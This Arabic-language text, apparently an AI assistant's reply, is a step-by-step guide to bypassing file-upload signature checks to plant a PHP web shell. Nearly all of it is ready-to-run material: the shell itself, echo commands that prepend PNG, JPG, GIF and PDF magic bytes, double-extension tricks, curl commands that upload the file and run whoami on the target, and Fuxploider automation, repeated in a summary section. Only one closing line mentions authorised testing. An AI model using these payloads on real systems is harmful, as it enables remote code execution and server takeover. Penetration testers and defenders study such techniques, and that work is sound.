
## الخطوات العملية لتغيير السيجنتشر للملف

1. **إعداد البيئة**:
   - استخدم أداة وكيل مثل Burp Suite أو OWASP ZAP لاعتراض وتعديل طلبات تحميل الملفات.
   - قم بإنشاء ملف ويب شيل بسيط (مثل PHP) لاختبار التنفيذ:
     ```php
     <?php system($_GET['cmd']); ?>
     ```
     احفظه باسم shell.php.
   - استخدم أدوات مثل `xxd` أو `echo -ne` لإضافة البايتات السحرية إلى الملف.
   - افتح أدوات المطورين في المتصفح (F12) لمراقبة استجابات الخادم.
   - حدد نقطة تحميل الملفات في الموقع (مثل نموذج تحميل صور).

2. **اختبار التحميل المباشر**:
   - حاول تحميل shell.php مباشرة عبر واجهة الموقع.
   - استخدم Burp Suite لاعتراض طلب POST وفحص استجابة الخادم (مثل "نوع الملف غير صالح" أو رمز حالة HTTP 403).
   - إذا فشل التحميل، انتقل إلى تعديل البايتات السحرية.

3. **إضافة البايتات السحرية**:
   - حدد نوع الملف المسموح (مثل JPG، PNG، GIF) وأضف البايتات الس سحرية المقابلة في بداية الملف.
   - أمثلة على البايتات السحرية:
     - **PNG**: `\x89PNG\r\n\x1a\n\0\0\0\rIHDR`
     - **JPG**: `\xff\xd8\xff`
     - **GIF**: `GIF87a` أو `GIF89a`
   - استخدم أدوات مثل `echo -ne` لإنشاء ملف جديد يبدأ بالبايتات السحرية، متبوعًا بالشيفرة الخبيثة.
   - أرسل الطلب مع تعديل Content-Type إلى نوع مناسب (مثل image/png).

4. **مراقبة الاستجابات**:
   - تحقق مما إذا تم تحميل الملف بنجاح (مثل رسالة "تم التحميل" أو ظهور اسم الملف).
   - حاول الوصول إلى الملف عبر المتصفح أو curl:
     ```bash
     curl 'http://<target>/Uploads/shell.png?cmd=whoami'
     ```
   - **نجاح (True)**: إذا تم تنفيذ الأمر (مثل إرجاع مخرجات whoami)، فهذا يؤكد وجود ثغرة.
   - **فشل (False)**: إذا رفض الخادم الملف أو لم يتم تنفيذه، جرب بايتات سحرية أخرى أو امتداد مختلف.

5. **تجربة تقنيات إضافية**:
   - إذا فشل نوع بايتات سحرية واحد، جرب أنواعًا أخرى (مثل GIF أو JPEG).
   - ادمج البايتات السحرية مع تقنيات أخرى (مثل الامتدادات المزدوجة مثل shell.php.png أو تغيير Content-Type).
   - استخدم أدوات مثل ImageMagick لإنشاء ملفات صور تحتوي على شيفرة خبيثة:
     ```bash
     convert -size 110x110 xc:white shell.jpg
     echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg
     ```
   - استخدم أدوات أتمتة مثل Fuxploider:
     ```bash
     python3 fuxploider.py --url http://<target>/upload --extensions php,png --content-type image/png
     ```

6. **تأكيد التنفيذ**:
   - تحقق من تنفيذ الملف عبر إرسال أوامر بسيطة (مثل whoami أو ls).
   - إذا نجحت، سجل البايتات السحرية والامتداد المستخدم للتوثيق.
   - انتقل إلى اختبار هجمات أخرى (مثل استغلال ملفات الإعدادات أو ImageMagick).

---

## جميع المحاولات الممكنة لتغيير السيجنتشر للملف

فيما يلي قائمة شاملة بجميع التقنيات الممكنة لتغيير البايتات السحرية، مقسمة إلى فئات مع شرح كل تقنية، كيف تعمل، متى تُستخدم، والأوامر المرتبطة بها.

```php
<?php system($_GET['cmd']); ?>
```

### 1. إضافة بايتات سحرية لـ PNG
**شرح**: إضافة تسلسل البايتات السحرية لملف PNG (`\x89PNG\r\n\x1a\n\0\0\0\rIHDR`) في بداية ملف PHP ليبدو كصورة PNG.
**كيف يعمل**: الخادم يفحص البايتات الأولى ويقبل الملف كـ PNG، لكنه قد يُنفذه كـ PHP إذا كان الامتداد .php أو بسبب إعدادات خاطئة.
**متى يُستخدم؟**: عندما يتحقق الخادم من البايتات السحرية للصور ويسمح بامتدادات مثل .png.
**المحاولات**:
- إنشاء ملف shell.png يبدأ بـ `\x89PNG\r\n\x1a\n\0\0\0\rIHDR` متبوعًا بشيفرة PHP.
**الأوامر**:
- إنشاء الملف:
  ```bash
  echo -ne '\x89PNG\r\n\x1a\n\0\0\0\rIHDR' > shell.png
  echo '<?php system($_GET["cmd"]); ?>' >> shell.png
  ```
- تحميل الملف:
  ```bash
  curl -X POST -H "Content-Type: image/png" -F "file=@shell.png" http://<target>/upload
  ```
- اختبار التنفيذ:
  ```bash
  curl 'http://<target>/Uploads/shell.png?cmd=whoami'
  ```

### 2. إضافة بايتات سحرية لـ JPG
**شرح**: إضافة تسلسل البايتات السحرية لملف JPG (`\xff\xd8\xff`) في بداية ملف PHP ليبدو كصورة JPG.
**كيف يعمل**: الخادم يقبل الملف كـ JPG بناءً على البايتات السحرية، لكنه قد يُنفذه كـ PHP إذا كان الامتداد مناسبًا.
**متى يُستخدم؟**: عندما يتحقق الخادم من البايتات السحرية لـ JPG ويسمح بامتدادات مثل .jpg.
**المحاولات**:
- إنشاء ملف shell.jpg يبدأ بـ `\xff\xd8\xff` متبوعًا بشيفرة PHP.
**الأوامر**:
- إنشاء الملف:
  ```bash
  echo -ne '\xff\xd8\xff' > shell.jpg
  echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg
  ```
- تحميل الملف:
  ```bash
  curl -X POST -H "Content-Type: image/jpeg" -F "file=@shell.jpg" http://<target>/upload
  ```
- اختبار التنفيذ:
  ```bash
  curl 'http://<target>/Uploads/shell.jpg?cmd=whoami'
  ```

### 3. إضافة بايتات سحرية لـ GIF
**شرح**: إضافة تسلسل البايتات السحرية لملف GIF (`GIF87a` أو `GIF89a`) في بداية ملف PHP ليبدو كصورة GIF.
**كيف يعمل**: الخادم يقبل الملف كـ GIF، لكنه قد يُنفذه كـ PHP إذا كان الامتداد .php أو بسبب إعدادات خاطئة.
**متى يُستخدم؟**: عندما يسمح الخادم بملفات GIF ويتحقق من البايتات السحرية.
**المحاولات**:
- إنشاء ملف shell.gif يبدأ بـ `GIF89a` متبوعًا بشيفرة PHP.
**الأوامر**:
- إنشاء الملف:
  ```bash
  echo -ne 'GIF89a' > shell.gif
  echo '<?php system($_GET["cmd"]); ?>' >> shell.gif
  ```
- تحميل الملف:
  ```bash
  curl -X POST -H "Content-Type: image/gif" -F "file=@shell.gif" http://<target>/upload
  ```
- اختبار التنفيذ:
  ```bash
  curl 'http://<target>/Uploads/shell.gif?cmd=whoami'
  ```

### 4. دمج البايتات السحرية مع الامتدادات المزدوجة
**شرح**: إضافة بايتات سحرية (مثل `\x89PNG`) مع استخدام امتداد مزدوج (مثل shell.php.png) لتجاوز كل من فحص البايتات والامتداد.
**كيف يعمل**: البايتات السحرية تجعل الملف يبدو كصورة، بينما الامتداد المزدوج يسمح بتنفيذه كـ PHP.
**متى يُستخدم؟**: عندما يتحقق الخادم من البايتات السحرية والامتداد معًا.
**المحاولات**:
- إنشاء ملف shell.php.png يبدأ بـ `\x89PNG`.
- إنشاء ملف shell.php.jpg يبدأ بـ `\xff\xd8\xff`.
**الأوامر**:
- إنشاء الملف:
  ```bash
  echo -ne '\x89PNG\r\n\x1a\n\0\0\0\rIHDR' > shell.php.png
  echo '<?php system($_GET["cmd"]); ?>' >> shell.php.png
  ```
- تحميل الملف:
  ```bash
  curl -X POST -H "Content-Type: image/png" -F "file=@shell.php.png" http://<target>/upload
  ```
- اختبار التنفيذ:
  ```bash
  curl 'http://<target>/Uploads/shell.php.png?cmd=whoami'
  ```

### 5. استخدام ImageMagick لإنشاء ملف صورة مع شيفرة
**شرح**: استخدام أداة مثل ImageMagick لإنشاء صورة حقيقية تحتوي على شيفرة خبيثة، مع الحفاظ على البايتات السحرية الصحيحة.
**كيف يعمل**: الصورة تكون صالحة لفحص البايتات السحرية، لكنها تحتوي على شيفرة PHP يمكن تنفيذها.
**متى يُستخدم؟**: عندما يتطلب الخادم ملف صورة صالح تمامًا.
**المحاولات**:
- إنشاء صورة JPG تحتوي على شيفرة PHP.
**الأوامر**:
- إنشاء الملف:
  ```bash
  convert -size 110x110 xc:white shell.jpg
  echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg
  ```
- تحميل الملف:
  ```bash
  curl -X POST -H "Content-Type: image/jpeg" -F "file=@shell.jpg" http://<target>/upload
  ```
- اختبار التنفيذ:
  ```bash
  curl 'http://<target>/Uploads/shell.jpg?cmd=whoami'
  ```

### 6. إضافة بايتات سحرية لأنواع ملفات أخرى
**شرح**: استخدام بايتات سحرية لأنواع ملفات أخرى غير الصور (مثل PDF أو ZIP) لتجاوز فحص البايتات.
**كيف يعمل**: الخادم قد يقبل أنواع ملفات أخرى غير الصور، مما يسمح بتحميل ملفات تحتوي على شيفرة خبيثة.
**متى يُستخدم؟**: عندما يسمح الخادم بأنواع ملفات مثل PDF أو ZIP.
**المحاولات**:
- **PDF**: `\x25\x50\x44\x46` (%PDF)
- **ZIP**: `\x50\x4b\x03\x04` (PK..)
**الأوامر**:
- إنشاء ملف PDF:
  ```bash
  echo -ne '\x25\x50\x44\x46' > shell.pdf
  echo '<?php system($_GET["cmd"]); ?>' >> shell.pdf
  ```
- تحميل الملف:
  ```bash
  curl -X POST -H "Content-Type: application/pdf" -F "file=@shell.pdf" http://<target>/upload
  ```
- اختبار التنفيذ:
  ```bash
  curl 'http://<target>/Uploads/shell.pdf?cmd=whoami'
  ```

---

## ملخص جميع الأوامر لكل تقنية

1. **إضافة بايتات سحرية لـ PNG**:
   ```bash
   echo -ne '\x89PNG\r\n\x1a\n\0\0\0\rIHDR' > shell.png
   echo '<?php system($_GET["cmd"]); ?>' >> shell.png
   curl -X POST -H "Content-Type: image/png" -F "file=@shell.png" http://<target>/upload
   curl 'http://<target>/Uploads/shell.png?cmd=whoami'
   ```

2. **إضافة بايتات سحرية لـ JPG**:
   ```bash
   echo -ne '\xff\xd8\xff' > shell.jpg
   echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg
   curl -X POST -H "Content-Type: image/jpeg" -F "file=@shell.jpg" http://<target>/upload
   curl 'http://<target>/Uploads/shell.jpg?cmd=whoami'
   ```

3. **إضافة بايتات سحرية لـ GIF**:
   ```bash
   echo -ne 'GIF89a' > shell.gif
   echo '<?php system($_GET["cmd"]); ?>' >> shell.gif
   curl -X POST -H "Content-Type: image/gif" -F "file=@shell.gif" http://<target>/upload
   curl 'http://<target>/Uploads/shell.gif?cmd=whoami'
   ```

4. **دمج البايتات السحرية مع الامتدادات المزدوجة**:
   ```bash
   echo -ne '\x89PNG\r\n\x1a\n\0\0\0\rIHDR' > shell.php.png
   echo '<?php system($_GET["cmd"]); ?>' >> shell.php.png
   curl -X POST -H "Content-Type: image/png" -F "file=@shell.php.png" http://<target>/upload
   curl 'http://<target>/Uploads/shell.php.png?cmd=whoami'
   ```

5. **استخدام ImageMagick لإنشاء ملف صورة مع شيفرة**:
   ```bash
   convert -size 110x110 xc:white shell.jpg
   echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg
   curl -X POST -H "Content-Type: image/jpeg" -F "file=@shell.jpg" http://<target>/upload
   curl 'http://<target>/Uploads/shell.jpg?cmd=whoami'
   ```

6. **إضافة بايتات سحرية لأنواع ملفات أخرى**:
   ```bash
   echo -ne '\x25\x50\x44\x46' > shell.pdf
   echo '<?php system($_GET["cmd"]); ?>' >> shell.pdf
   curl -X POST -H "Content-Type: application/pdf" -F "file=@shell.pdf" http://<target>/upload
   curl 'http://<target>/Uploads/shell.pdf?cmd=whoami'
   ```

---

## نصائح إضافية
- **استخدام أدوات الوكيل**: استخدم Burp Suite أو OWASP ZAP لتعديل رؤوس Content-Type ومراقبة الطلبات.
- **دمج مع تقنيات أخرى**: ادمج البايتات السحرية مع تجاوز الامتدادات (مثل shell.php.jpg) أو التلاعب بنوع MIME.
- **اختبار أنواع متعددة**: جرب بايتات سحرية لأنواع ملفات مختلفة (مثل PNG، JPG، GIF، PDF) بناءً على القيود.
- **أتمتة الاختبار**: استخدم Fuxploider لاختبار البايتات السحرية مع امتدادات متعددة:
  ```bash
  python3 fuxploider.py --url http://<target>/upload --extensions php,png --content-type image/png
  ```
- **التحقق من التنفيذ**: تحقق دائمًا من تنفيذ الملف عبر curl أو المتصفح.
- **الاختبار بمسؤولية**: اختبر فقط على أهداف مُصرح بها (مثل بيئات مختبرية أو برامج مكافآت الأخطاء).

إذا كنت تريد شرح خطوة أخرى (مثل Exploit Configuration Files أو Embed Payloads in Image Metadata) بنفس الأسلوب، أو تركيزًا على نوع خادم معين، أخبرني وسأقدم ردًا مخصصًا!